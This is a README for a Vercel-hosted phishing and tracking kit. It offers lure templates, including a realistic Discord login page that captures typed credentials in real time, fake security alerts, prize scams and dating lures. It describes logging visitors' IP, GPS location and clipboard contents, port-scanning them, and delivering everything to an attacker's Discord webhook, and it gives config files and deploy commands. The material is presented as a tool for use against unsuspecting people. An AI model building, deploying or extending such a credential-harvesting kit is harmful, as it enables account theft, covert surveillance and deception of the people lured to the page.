# Vercel Tracker Page

A serverless web tracking and analytics page deployed on Vercel. Provides visitor analysis including IP address, geolocation, ISP detection, automated agent identification, reverse DNS, port scanning, and optional GPS coordinates and clipboard contents (with browser permission).

## Features

- **IP Intelligence**: Geolocation, ISP, ASN, organization lookup
- **ISP Detection**: Identifies proxy and hosting provider IPs
- **Agent Detection**: Identifies 19+ known automated agent user agents
- **Reverse DNS**: PTR record lookups for visitor IPs
- **Port Scanning**: Common port availability checks
- **GPS Logging** (optional): Browser geolocation API with permission prompt — only when `enable_gps: true`
- **Clipboard Logging** (optional): Browser clipboard API read with permission prompt — only when `enable_clipboard: true`
- **Credential Capture** (Discord login): Real-time typing capture with 20-second inactivity timeout
- **Webhook Delivery**: Comprehensive data delivery to Discord
- **Customizable Templates**: 6 page templates plus custom HTML support

## Template Types

| Type | Description |
|------|-------------|
| `discord_login` | Realistic Discord-style login page (default) — collects email & password in real-time |
| `error` | Convincing security alert page with animated scan bar |
| `prize` | Professional gift card promotion with trophy animation |
| `egirl` | Dating site landing page with realistic photos and trust badges |
| `custom` | User-provided HTML content |
| `image` | Standard tracking pixel |

## Configuration

### webhook-config.json
```json
{
  "WEBHOOK_URL": "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
}
```

### lure-config.json
Each deployment uses the `lure-config.json` at build time. Change it and redeploy for a new configuration.

```json
{
  "lure_type": "discord_login",
  "custom_html": "",
  "enable_gps": true,
  "enable_clipboard": true,
  "custom_title": "Login Required"
}
```

### Config Options

| Option | Default | Description |
|--------|---------|-------------|
| `lure_type` | `discord_login` | Page template to serve |
| `enable_gps` | `true` | Whether to request geolocation permission on page load |
| `enable_clipboard` | `true` | Whether to request clipboard permission on page load |
| `custom_html` | `""` | Custom HTML content (for `lure_type: "custom"`) |
| `custom_title` | `"Login Required"` | Browser tab title |

**Important**: GPS and clipboard permission prompts only appear when the corresponding `enable_*` option is `true` in the config. Disabling them means no permission requests will be made.

## Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Serves the tracking page with configured template |
| `/api/image` | GET | Returns the tracking pixel image |
| `/api/logs` | GET | Returns all captured data as JSON |
| `/api/track-extra` | POST | Receives GPS/clipboard/credential data from browser |

## Quick Deploy

```bash
npm i -g vercel
cd core/vercel-tracker
vercel --prod
```

After deployment, configure environment variables in the Vercel dashboard:
- `DISCORD_WEBHOOK_URL` — Your webhook URL

Or use the `webhook-config.json` file.

## How It Works

1. Visitor loads the tracking page (GET `/`)
2. The serverless function captures: IP, user agent, referrer
3. Enriches with: ISP detection, agent detection, reverse DNS, port scan, location/ISP/ASN
4. Stores log entry and sends webhook **once** (deduplicated per IP)
5. If `enable_gps` is `true`, geolocation permission is requested automatically
6. If `enable_clipboard` is `true`, clipboard permission is requested automatically
7. Browser sends GPS/clipboard/credential data to `/api/track-extra`
8. Log entry is updated with new data (no duplicate webhook)
9. For Discord login: credentials are captured in real-time (every 20 seconds of typing activity)
10. All data stored in `/tmp/image_logger_logs.json`

## Deployment Notes

- Each deployment picks up the `lure-config.json` file at build time
- To change the template or toggle features, update `lure-config.json` and redeploy
- Each unique configuration requires its own Vercel deployment for a separate URL
- The `/api/image` endpoint returns the tracking pixel
- Visit the root URL `/` to see the template page

## Notes

- GPS, clipboard, and credential data require explicit browser permission
- If the user denies or closes the page before granting, all other information is still sent
- Port scanning uses short timeouts and only checks common ports
- The `/tmp` storage is ephemeral and resets on each deployment
- Webhook is sent exactly once per unique IP (no duplicates)

## Tutorial

Setup and usage tutorials:
https://www.youtube.com/@kydn-iu5kd